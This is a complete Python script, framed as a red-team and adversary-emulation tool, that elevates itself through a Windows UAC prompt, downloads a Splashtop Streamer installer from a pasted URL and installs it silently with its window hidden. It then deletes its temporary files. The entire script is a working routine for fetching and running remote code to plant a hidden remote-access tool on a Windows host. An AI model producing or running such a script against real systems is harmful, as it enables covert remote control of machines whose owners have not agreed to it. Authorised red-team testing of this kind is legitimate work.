#!/usr/bin/env python3

"""
Python script to download and run Splashtop client for remote support sessions. 
Python needs to be installed on the host already for this to work.
This script is for testing/red team purposes - use only for legal and ethical testing scenarios
For red team/adversarial emulation, you may want to adapt to your specific purposes.  
Paste your URL for Splashtop where it says (Paste Install URL here).  
Note: This is not the URL they give you; it is the secondary URL you hunt for via F12, network, and filter on zip.
See the Readme.md files for how to use, including detailed setup steps. 
"""

import os
import sys
import ctypes
import tempfile
import shutil
import subprocess

try:
    import requests
except ImportError:
    print("Missing dependency: requests. Install with `pip install requests`.")
    sys.exit(1)

def is_admin():
    """Returns True if the current process has admin rights."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def elevate():
    """Relaunches this script with UAC elevation and exits, reporting if elevation fails."""
    params = ' '.join(f'"{arg}"' for arg in sys.argv)
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, params, None, 1
    )
    if ret <= 32:
        print("Elevation failed or was cancelled.")
        sys.exit(1)
    # otherwise the elevated process has been launched; exit this one
    sys.exit()

def download_installer(url, dest_path):
    """Streams download of URL to dest_path."""
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(dest_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

def main():
    if os.name != "nt":
        print("This installer script only runs on Windows.")
        sys.exit(1)

    # 1) Elevate if needed
    if not is_admin():
        print("Elevating to admin...")
        elevate()

    # 2) Prepare download
    DOWNLOAD_URL = (
        "(Paste Install URL here)"
    )
    installer_name = os.path.basename(DOWNLOAD_URL)
    temp_dir = tempfile.mkdtemp(prefix="splashtop_")
    installer_path = os.path.join(temp_dir, installer_name)

    try:
        print(f"Downloading {installer_name} to {installer_path} …")
        download_installer(DOWNLOAD_URL, installer_path)
        print("Download complete.")

        # 3) Run silent install
        # Uses Splashtop’s silent-install parameters:
        #   prevercheck: required
        #   /s : silent
        #   /i : command-line mode
        #   hidewindow=1 : no UI post-install
        cmd = [
            installer_path,
            "prevercheck", "/s", "/i",
            "hidewindow=1"
        ]
        print("Installing Splashtop Streamer silently …")
        subprocess.run(cmd, check=True)
        print("Installation finished successfully.")

    except subprocess.CalledProcessError as e:
        print(f"Installer exited with code {e.returncode}.")
        sys.exit(e.returncode)
    except Exception as e:
        print("ERROR:", e)
        sys.exit(1)
    finally:
        # 4) Cleanup
        shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
